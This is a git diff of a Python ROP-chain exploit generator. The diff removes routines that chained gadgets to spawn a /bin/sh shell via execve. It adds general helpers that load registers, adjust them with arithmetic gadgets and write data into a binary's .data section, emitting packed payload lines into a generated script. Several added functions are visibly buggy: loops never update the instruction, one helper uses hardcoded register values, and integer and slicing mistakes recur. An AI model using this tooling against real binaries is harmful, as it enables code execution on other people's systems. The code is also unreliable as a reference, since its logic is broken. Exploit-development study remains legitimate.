@@ -11,57 +11,12 @@ import categorize
 import get_gadgets
 
 
-
-# Takes in 1-instruction GadgetList (general.ALLGADGETS) and name of the vulnerable executable
-# This is the driver routine which will chain the rop-gadgets and get execve shellcode
-def execveROPChain(GadgetList, vulnExecutable): 
-
-    print("\n\n-->Chaining to get a shell using execve system call")
-
-    fd = open(vulnExecutable, "rb")
-    elffile = ELFFile(fd)
-    data_section = ".data"
-    section = elffile.get_section_by_name(data_section)
-    
-    # We need .data section's details because we have to write "/bin//sh" into it. 
-    data_section_addr = section["sh_addr"]
-    data_section_size = section["sh_size"]
-
-    syscallList = categorize.checkIfSyscallPresent(GadgetList)
-    intList = categorize.checkIfIntPresent(GadgetList)
-
-    if len(intList) == 0 and len(syscallList) == 0: 
-        print("No int 0x80, no syscall, no ROP")
-        print("Exiting tool :(")
-        sys.exit()
-    
-    # There are 2 choices here: 
-    
-    # Choice - 1
-    # if syscall is found, 
-        # rax <- 59
-        # rdi <- Address of "/bin/sh"
-        # rsi <- 0
-        # rdx <- 0
-        # syscall
-    if len(syscallList) > 0: 
-        case2(GadgetList, data_section_addr)
-        sys.exit()
-
-    # Choice - 2
-    # if int 0x80 is found, 
-        # rax <- 11
-        # rbx <- Address of "/bin/sh"
-        # rcx <- 0
-        # rdx <- 0
-        # int 0x80
-    elif len(intList) > 0: 
-        case1(GadgetList, data_section_addr)
-        sys.exit()
-
-    print("--> No syscall / int 0x80 found => ROP Chaining failed")
-    sys.exit()
-
+# This routine gets gadgets which will help in writing stuff into a writable section. 
+# This is the 3 gadgets this routine will return
+# 
+# 1. pop Reg1; ret  -- Load address where something is to be written.
+# 2. pop Reg2; ret  -- Load the content to be written - 8 bytes
+# 3. mov qword ptr[Reg1], Reg2; ret - Copy contents of Ret2 into address present in Reg1
 
 def canWrite(movQwordGadgets, popGadgets):
     for gadget in movQwordGadgets:
@@ -87,396 +42,21 @@ def canWrite(movQwordGadgets, popGadgets):
     return list()
 
 
-# If "int 0x80" is present
-def case1(GadgetList) : 
-
-    print("Entering case1")
-
-    fd = open("execveChain.py", "w")
-    writeHeader(fd)
-
-    raxList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rax")
-    # print(raxList)
-    
-
-    # rax <- 11
-    
-    # Search for "pop rax; ret"
-    x = 0
-    while x < len(raxList) : 
-
-        gadget = raxList[x]
-        inst = gadget[0]
-
-        if inst['mnemonic'] == "pop" : 
-                
-            # "pop rax; ret" found. 
-            # Steps to be taken: 
-                # Put 11 in the payload
-                # Execute "pop rax; ret"
-               
-
-            # Write it into the file
-            fd.write("payload += struct.pack('<Q', 11)")
-            fd.write("\t\t# execve's system call number = 11")
-            fd.write("\n\t")
-            fd.write("payload += struct.pack('<Q', ")
-            fd.write(hex(int(inst['address'])))
-            fd.write(")")
-            fd.write("\t\t# Address of 'pop rax; ret'")
-            fd.write("\n\t")
-            break
-        
-        x = x + 1
-    
-    # Search for "xor rax, rax; ret"
-    x = 0
-    while x < len(raxList): 
-  
-        if inst['mnemonic'] == "xor" : 
-
-            # "xor rax, rax; ret" found
-            # Jackpot!
-            # Steps to do: 
-                # Execute "xor rax, rax; ret"
-                # Find for arithmetic gadgets which will increase rax's value to 11
-
-
-            # Write it into the file
-            fd.write("payload += struct.pack('<Q', ")
-            fd.write(hex(int(inst['address'])))
-            fd.write(")")
-            fd.write("\t\t# Address of 'xor rax, rax; ret'")
-            fd.write("\n\t")
-
-            if changeRegValue(GadgetList, "rax", 0, 11, payload, fd) == 0: 
-                print("Unable to find gadgets which can change rax's value")
-                print("Exiting...")
-                sys.exit()
-
-            break
-
-        # Keep the loop going!
-        x = x + 1
-
-    # TODO: Load "/bin//sh" into .data section
-    # TODO: Load address of .data into rbx
-
-    # # rcx <- 0
-    rcxList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rcx")
-    print(rcxList)
-    rcxList = categorize.queryGadgets(GadgetList, general.MOVREGG, "rcx")
-    print(rcxList)
-    rcxList = categorize.queryGadgets(GadgetList, general.ARITHMETICLOADG, "rcx")
-    print(rcxList)
-    x = 0
-    while(x < len(rcxList)):
-        gadget = rcxList[x]
-        inst = gadget[0]
-        if inst['mnemonic'] == "pop" :
-            # "pop rcx; ret" found. 
-            # Steps to be taken: 
-                # Put 0 in the payload
-                # Execute "pop rax; ret"
-                               
-
-            # Write it into the file
-            fd.write("payload += struct.pack('<Q', 0)")
-            fd.write("\n\t")
-            fd.write("payload += struct.pack('<Q', ")
-            fd.write(hex(int(inst['address'])))
-            fd.write(")")
-            fd.write("\n\t")
-            break
-        x = x + 1
-
-    # # rdx <- 0
-    # rdxList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rdx")
-    # x = 0
-
-    # while(x < len(rdxList)):
-    #     gadget = rdxList[x]
-    #     inst = gadget[0]
-    #     if inst['mnemonic'] == "pop" :
-    #         # "pop rcx; ret" found. 
-    #         # Steps to be taken: 
-    #             # Put 0 in the payload
-    #             # Execute "pop rax; ret"
-               
-    #         # Update payload
-    #         payload += struct.pack("<Q", 0)
-    #         payload += struct.pack("<Q", int(inst['address']))
-                
-
-    #         # Write it into the file
-    #         fd.write("payload += struct.pack('<Q', 0)")
-    #         fd.write("\n\t")
-    #         fd.write("payload += struct.pack('<Q', ")
-    #         fd.write(hex(int(inst['address'])))
-    #         fd.write(")")
-    #         fd.write("\n\t")
-    #         break
-    #     x = x + 1
-
-
-# If "syscall" instruction is found: 
-
-# These are the steps to be followed. 
+# This routine changes the value of a specified register. 
+# Reg = Target Register
+# CurrentValue - Present value of "rax"
+# FinalValue - The value you want in "rax" (Say a system call number)
+# 
+# Eg:  Reg = "rax", CurrentValue = 0, FinalValue = 59 
+# 
+# This routine will find arithmetic gadgets related to the target register, tries chaining them.
 #
-# 1. rax <- 59
-# 2. Write "/bin//sh" into .data section
-# 3. rdi <- .data section's address
-# 4. rsi <- 0
-# 5. rdx <- 0
-# 6. Execute "syscall" instruction
-
-def case2(GadgetList, data_section_addr) : 
-
-    # Open the file where the payload is written in the form of a python script
-    fd = open("execveChain.py", "w")
-    writeHeader(fd)
-    
-    # Step-2: Writing "/bin//sh" into .data section
-    
-    popGadgets = get_gadgets.getPopGadgets(get_gadgets.allGadgets)
-    movQwordGadgets = get_gadgets.getMovQwordGadgets(get_gadgets.allGadgets)
-
-    movpopGadgets = canWrite(movQwordGadgets, popGadgets)
-
-    movGadget = movpopGadgets[0][0]
-    popGadget1 = movpopGadgets[1][0]
-    popGadget2 = movpopGadgets[2][0]
-   
-    
-    # Execute popGadget1 => Reg1 will have .data's address
-    fd.write("payload += struct.pack('<Q', ")
-    fd.write(hex(int(popGadget1['address'])))
-    fd.write(")")
-    fd.write("\t\t# Address of pop Reg1; ret")
-    fd.write("\n\t")
-
-    # Put .data's address onto stack
-    fd.write("payload += struct.pack('<Q', ")
-    fd.write(hex(int(data_section_addr)))
-    fd.write(")")
-    fd.write("\t\t# Address of .data section")
-    fd.write("\n\t")
-
-   
-    # Execute popGadget2 => Reg2 will have "/bin/sh"
-    fd.write("payload += struct.pack('<Q', ")
-    fd.write(hex(int(popGadget2['address'])))
-    fd.write(")")
-    fd.write("\t\t# Address of pop Reg2; ret")
-    fd.write("\n\t")
-
-    # Put "/bin//sh" into stack
-    fd.write("payload += struct.pack('<Q', ")
-    fd.write("0x68732f2f6e69622f")
-    fd.write(")")
-    fd.write("\t\t# ascii of '/bin//sh'")
-    fd.write("\n\t")
-
-    # Execute movGadget - "mov qword ptr[Reg1], Reg2", ret"
-    fd.write("payload += struct.pack('<Q', ")
-    fd.write(hex(int(movGadget['address'])))
-    fd.write(")")
-    fd.write("\t\t# Address of pop qword ptr [Reg1], Reg2; ret")
-    fd.write("\n\t")
-
-    
-    # At this point, payload to write "/bin//sh" is successfully written into execcvevChain.py
-
-
-    # Step-1: rax <- 59
-    raxList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rax")
-
-    # Search for "pop rax; ret"
-    x = 0
-    while x < len(raxList) : 
-
-        gadget = raxList[x]
-        inst = gadget[0]
-
-        if inst['mnemonic'] == "pop" : 
-                
-            # "pop rax; ret" found. 
-            # Steps to be taken: 
-                # Put 11 in the payload
-                # Execute "pop rax; ret"
-               
-
-            # Write it into the file
-            fd.write("payload += struct.pack('<Q', 59)")
-            fd.write("\t\t# execve's system call number = 59")
-            fd.write("\n\t")
-            fd.write("payload += struct.pack('<Q', ")
-            fd.write(hex(int(inst['address'])))
-            fd.write(")")
-            fd.write("\t\t# Address of 'pop rax; ret'")
-            fd.write("\n\t")
-            break
-        
-        x = x + 1
-    
-    # Search for "xor rax, rax; ret"
-    x = 0
-    while x < len(raxList): 
-  
-        if inst['mnemonic'] == "xor" : 
-
-            # "xor rax, rax; ret" found
-            # Jackpot!
-            # Steps to do: 
-                # Execute "xor rax, rax; ret"
-                # Find for arithmetic gadgets which will increase rax's value to 11
-
-
-            # Write it into the file
-            fd.write("payload += struct.pack('<Q', ")
-            fd.write(hex(int(inst['address'])))
-            fd.write(")")
-            fd.write("\t\t# Address of 'xor rax, rax; ret'")
-            fd.write("\n\t")
-
-            # print("\n\n\nxor rax, rax; ret: ", inst)
-
-            if changeRegValue(GadgetList, "rax", 0, 59, fd) == 0: 
-                print("Unable to find gadgets which can change rax's value")
-                print("Exiting...")
-                sys.exit()
-
-            break
-
-        # Keep the loop going!
-        x = x + 1
-
-
-    # Put "address of .data onto the stack"
-    # Execute "pop rsi; ret"
-
-    # fd.write("payload += struct.pack('<Q', ")
-    # fd.write(hex(int(data_section_addr)))
-    # fd.write(")")
-    # fd.write("\t\t# Address of .data section")
-    # fd.write("\n\t")
-
-    # # rsi <- 0
-    rsiList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rsi")
-    x = 0
-    while(x < len(rsiList)):
-        gadget = rsiList[x]
-        inst = gadget[0]
-        if inst['mnemonic'] == "pop" :
-            # "pop rsi; ret" found. 
-            # Steps to be taken: 
-                # Put 0 in the payload
-                # Execute "pop rsi; ret"
-                               
-            # Write it into the file
-            fd.write("payload += struct.pack('<Q', ")
-            fd.write(hex(int(inst['address'])))
-            fd.write(")")
-            fd.write("\t\t# Address of pop rsi; ret")
-            fd.write("\n\t")
-            
-            fd.write("payload += struct.pack('<Q', ")
-            fd.write("0")
-            fd.write(")")
-            fd.write("\n\t")
-
-           
-            break
-        x = x + 1
-
-
-    # rdi <- 0
-    rdiList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rdi")
-
-    x = 0
-    while(x < len(rdiList)) : 
-        
-        gadget = rdiList[x]
-        inst = gadget[0]
-        if inst['mnemonic'] == "pop" :
-            # "pop rdi; ret" found. 
-            # Steps to be taken: 
-                # Put 0 in the payload
-                # Execute "pop rdi; ret"
-               
-                
-            # Write it into the file
-            fd.write("payload += struct.pack('<Q', ")
-            fd.write(hex(int(inst['address'])))
-            fd.write(")")
-            fd.write("\t\t# Address of pop rdi; ret")
-            fd.write("\n\t")
-
-            fd.write("payload += struct.pack('<Q', ")
-            fd.write(hex(data_section_addr))
-            fd.write(")")
-            fd.write("\t\t# Address of .data section")
-            fd.write("\n\t")
-            break
-        x = x + 1
-
-    # rdx <- 0
-    rdxList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rdx")
-    x = 0
-
-    while(x < len(rdxList)):
-        gadget = rdxList[x]
-        inst = gadget[0]
-        if inst['mnemonic'] == "pop" :
-            # "pop rcx; ret" found. 
-            # Steps to be taken: 
-                # Put 0 in the payload
-                # Execute "pop rax; ret"
-               
-
-            # Write it into the file
-           
-            fd.write("payload += struct.pack('<Q', ")
-            fd.write(hex(int(inst['address'])))
-            fd.write(")")
-            fd.write("\t\t# Address of pop rdx; ret")
-            fd.write("\n\t")
-           
-            fd.write("payload += struct.pack('<Q', 0)")
-            fd.write("\n\t")
-           
-            break
-        x = x + 1
-
-
-    # Get syscall
-    syscallList = categorize.checkIfSyscallPresent(GadgetList)
-    syscallGadget = syscallList[0]
-    
-    syscallDict = syscallGadget[0]
-    syscallAddress = syscallDict['address']
-    
-    fd.write("payload += struct.pack('<Q', ")
-    fd.write(hex(int(syscallAddress)))
-    fd.write(")")
-    fd.write("\t\t# Address of syscall")
-    fd.write("\n\t")
-
-    
-    writeFooter(fd)
-    print("-->Written the complete payload in execveChain.py")
-    print("-->Chaining successful!")
-
-
+# Finally, writes the payload into the file descriptor specified.
 
 def changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, fd) : 
 
-    # print("Inside changeRegValue")
-
     RegArithList = categorize.queryGadgets(GadgetList, general.ARITHMETICG, Reg)
-    # print(RegArithList)
-    # print_pretty.print_pretty(RegArithList)
-
+  
     # A variable 
     const = 0
     X = 0
@@ -543,7 +123,7 @@ def changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, fd) :
        
         X = X + 1
     
-    # Search for "add Reg, 1; ret"
+    # Search for "add Reg, 1; ret" or "add Reg, -1; ret"
 
     X = 0
     while X < len(RegArithList) : 
@@ -553,17 +133,15 @@ def changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, fd) :
 
         if inst['mnemonic'] == "add" : 
 
-            # print("\n\n\nadd rax, 1; ret", inst)
-
             if inst['operands'][0].isnumeric() : 
                 const = int(inst['operands'][0])
             else : 
                 const = int(inst['operands'][1])
         
+            # Case: "add Reg, 1; ret"
             if const == 1 and FinalValue > CurrentValue : 
 
                 counter = 0
-                # print("F - C = ", FinalValue - CurrentValue)
                 while counter < (FinalValue - CurrentValue) : 
 
                     # execute "add Reg, 1; ret"
@@ -576,107 +154,258 @@ def changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, fd) :
                     fd.write("\n\t")
 
                     counter = counter + 1
-                    # print(counter)
                 
                 return 1
             
+            # Case: "add Reg, -1; ret"
+            elif const == -1 and FinalValue < CurrentValue : 
+
+                counter = 0
+                while counter < (CurrentValue - FinalValue) : 
+
+                    # execute "add Reg, -1; ret"
+
+                    # Write into file
+                    fd.write("payload += struct.pack('<Q', ")
+                    fd.write(hex(int(inst['address'])))
+                    fd.write(")")
+                    fd.write("\t\t# Address of 'add Reg, -1; ret'")
+                    fd.write("\n\t")
+
+                    counter = counter + 1
+            
+                return 1
+
         X = X + 1
 
 
+    # Search for "add Reg, const; ret"
 
-    # Search for "add Reg, 2; ret"
+    X = 0
+    while X < len(RegArithList) : 
 
-    
+        gadget = RegArithList[X]
+        inst = gadget[0]
+
+        if inst['mnemonic'] == "add" : 
+            
+            if inst['operands'][0].isnumeric() : 
+                const = int(inst['operands'][0])
+            else : 
+                const = int(inst['operands'][1])
+            
+            # Case "add Reg, const; ret" && const > 1
+            if const > 1 and FinalValue > CurrentValue : 
+
+                gap = FinalValue - CurrentValue
+                quo = gap / const
+                rem = gap % const
+
+                while quo > 0 : 
+
+                    # Execute add Reg, const; ret
+
+                    # Write into file
+                    fd.write("payload += struct.pack('<Q', ")
+                    fd.write(hex(int(inst['address'])))
+                    fd.write(")")
+                    fd.write("\t\t# Address of add Reg, const; ret")
+                    fd.write("\n\t")
+                    
+                    quo = quo - 1
+                    
+                    CurrentValue = CurrentValue + const
+                
+                # If CurrentValue is equal to FinalValue, goal achieved.
+                if FinalValue == CurrentValue: 
+                    return 1
+                
+                # Suppose that does not happen, 
+                # Call changeRegValue again and attempt to chain other gadgets to get the intended FinalValue
+                if changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, fd) == 0 : 
+                    print("Unable to find gadgets which can change rax's value")
+                    print("Exiting...")
+                    sys.exit()
+
+                # Suppose changeRegValue returns 1, success!
+                else : 
+                    return 1
         
+            if const < -1 and FinalValue < CurrentValue : 
 
-            # if const > 1 and FinalValue > CurrentValue :
-                
-            #     gap = FinalValue - CurrentValue
-            #     quo = gap / const
-            #     rem = gap % const
+                gap = FinalValue - CurrentValue
+                quo = gap / (-const)
+                rem = gap % (-const)
 
-            #     while quo > 0 : 
+                while quo > 0 : 
 
-            #         # execute add Reg, const; ret"
+                    # Execute add Reg, const; ret
 
-            #         # Write into file
-            #         fd.write("payload += struct.pack('<Q', ")
-            #         fd.write(hex(int(inst['address'])))
-            #         fd.write(")")
-            #         fd.write("\n\t")
+                    # Write into file
+                    fd.write("payload += struct.pack('<Q', ")
+                    fd.write(hex(int(inst['address'])))
+                    fd.write(")")
+                    fd.write("\t\t# Address of add Reg, const; ret")
+                    fd.write("\n\t")
                     
-            #         quo = quo - 1
-
-            #         CurrentValue = CurrentValue + const
-
-            #     if FinalValue == CurrentValue: 
-            #         return 1
-
-            #     if changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, payload, fd) == 0: 
-            #         print("Unable to find gadgets which can change rax's value")
-            #         print("Exiting...")
-            #         sys.exit()
-                
-            #     else : 
-            #         return 1
-
-            # if const == -1 and FinalValue < CurrentValue: 
-                
-            #     counter = 0
-            #     while counter < CurrentValue - FinalValue : 
-
-            #         # execute "add Reg, -1; ret"
-
-            #         # Write into file
-            #         fd.write("payload += struct.pack('<Q', ")
-            #         fd.write(hex(int(inst['address'])))
-            #         fd.write(")")
-            #         fd.write("\n\t")
+                    quo = quo - 1
                     
-            #         counter = counter + 1
+                    CurrentValue = CurrentValue + const
                 
-            #     return 1
+                # If CurrentValue is equal to FinalValue, goal achieved.
+                if FinalValue == CurrentValue: 
+                    return 1
+                
+                # Suppose that does not happen, 
+                # Call changeRegValue again and attempt to chain other gadgets to get the intended FinalValue
+                if changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, fd) == 0 : 
+                    print("Unable to find gadgets which can change rax's value")
+                    print("Exiting...")
+                    sys.exit()
+
+                # Suppose changeRegValue returns 1, success!
+                else : 
+                    return 1
+
+    return 
+
+
+def LoadConstIntoReg(GadgetList, Reg, Const, fd) : 
+
+    RegList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, Reg)
+
+    # Search for "pop Reg; ret"
+    x = 0
+    while x < len(RegList) : 
+
+        gadget = RegList[x]
+        inst = gadget[0]
+
+        if inst['mnemonic'] == "pop" : 
+
+            # "pop Reg; ret" is found
+            # Steps to be taken: 
+            #   1. Put Const onto stack
+            #   2. Execute "pop Reg; ret"
+
+            # Write it into the file
             
-            # if const < -1 and FinalValue < CurrentValue : 
+            # Write address of "pop Reg; ret"
+            fd.write("payload += struct.pack('<Q', ")
+            fd.write(hex(int(inst['address'])))
+            fd.write(")")
+            fd.write("\t\t# Address of 'pop Reg; ret'")
+            fd.write("\n\t")
+        
+            # Write Const onto stack
+            fd.write("payload += struct.pack('<Q', ")
+            fd.write(str(hex(Const)))
+            fd.write(")")
+            fd.write("\n\t")
+            
+            break
+        
+        x = x + 1
     
-            #     gap = CurrentValue - FinalValue
-            #     quo = gap / (-(const))
-                    
-            #     while quo > 0: 
+    # Search for "xor Reg, Reg; ret"
+    x = 0
+    while x < len(RegList) : 
 
-            #         # execute "add Reg, -ve number; ret"
+        if inst['mnemonic'] == "xor" : 
 
-            #         # Write into file
-            #         fd.write("payload += struct.pack('<Q', ")
-            #         fd.write(hex(int(inst['address'])))
-            #         fd.write(")")
-            #         fd.write("\n\t")
-                            
-            #         quo = quo - 1
+            # "xor Reg, Reg; ret" is found
+            # Loads 0 into Reg
+            # Jackpot!
+            # Steps to do: 
+            #   1. Execute "xor Reg, Reg; ret"
+            #   2. Call changeRegValue if Const != 0
 
-            #         CurrentValue = CurrentValue + const
-                
-            #     if FinalValue == CurrentValue : 
-            #         return 1
-                
-            #     if changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, payload, fd) == 0: 
-            #         print("Unable to find gadgets which can change rax's value")
-            #         print("Exiting...")
-            #         sys.exit()
-                
-            #     else : 
-            #         return 1
+            # Write it into the file
+            fd.write("payload += struct.pack('<Q', ")
+            fd.write(hex(int(inst['address'])))
+            fd.write(")")
+            fd.write("\t\t# Address of 'xor Reg, Reg; ret'")
+            fd.write("\n\t")
             
-        # TODO: Do the same for sub instruction
-        # Take care of recursive calls properly.
+            if int(Const) != 0 : 
+                if changeRegValue(GadgetList, "rax", 0, 59, fd) == 0: 
+                    print("Unable to find gadgets which can change rax's value")
+                    print("Exiting...")
+                    sys.exit()
 
-        # main while loop
-        # Keep it going!
+                else: 
+                    return 1
+        x = x + 1
+    
 
+# This routine generates payload which will write stuff into memory.
+#
+# data is of bytes() type
+# addr is the address of a writable section of the executable
+# fd is the file descriptor of python payload file
 
-    return ("qwwe", "123")
+def WriteStuffIntoMemory(data, addr, fd) : 
 
+    popGadgets = get_gadgets.getPopGadgets(get_gadgets.allGadgets)
+    movQwordGadgets = get_gadgets.getMovQwordGadgets(get_gadgets.allGadgets)
 
+    movpopGadgets = canWrite(movQwordGadgets, popGadgets)
+
+    movGadget = movpopGadgets[0][0]
+    popGadget1 = movpopGadgets[1][0]
+    popGadget2 = movpopGadgets[2][0]
+   
+    count = 0
+    while len(data) > 0 : 
+
+        if len(data) <= 8: 
+            data_piece = data[count:]
+            # count = count + len(data)
+            data = ''
+
+        else : 
+            data_piece = data[count:8]
+            count = count + 8
+            data = data[count:]
+            # count = count + 8
+
+        # Execute popGadget1 => Reg1 will have .data's address
+        fd.write("payload += struct.pack('<Q', ")
+        fd.write(hex(int(popGadget1['address'])))
+        fd.write(")")
+        fd.write("\t\t# Address of pop Reg1; ret")
+        fd.write("\n\t")
+
+        # Put .data's address onto stack
+        fd.write("payload += struct.pack('<Q', ")
+        fd.write(hex(int(addr)))
+        fd.write(")")
+        fd.write("\t\t# Address of .data section")
+        fd.write("\n\t")
+
+    
+        # Execute popGadget2 => Reg2 will have "/bin/sh"
+        fd.write("payload += struct.pack('<Q', ")
+        fd.write(hex(int(popGadget2['address'])))
+        fd.write(")")
+        fd.write("\t\t# Address of pop Reg2; ret")
+        fd.write("\n\t")
+
+        # Put "/bin//sh" into stack
+        fd.write("payload += struct.pack('<Q', ")
+        fd.write(hex(int.from_bytes(data_piece, byteorder = 'little')))
+        fd.write(")")
+        fd.write("\t\t# ascii of '/bin//sh'")
+        fd.write("\n\t")
+
+        # Execute movGadget - "mov qword ptr[Reg1], Reg2", ret"
+        fd.write("payload += struct.pack('<Q', ")
+        fd.write(hex(int(movGadget['address'])))
+        fd.write(")")
+        fd.write("\t\t# Address of pop qword ptr [Reg1], Reg2; ret")
+        fd.write("\n\t")
+        
+        
 def writeHeader(fd) : 
 
     fd.write("#!/usr/bin/env python3")
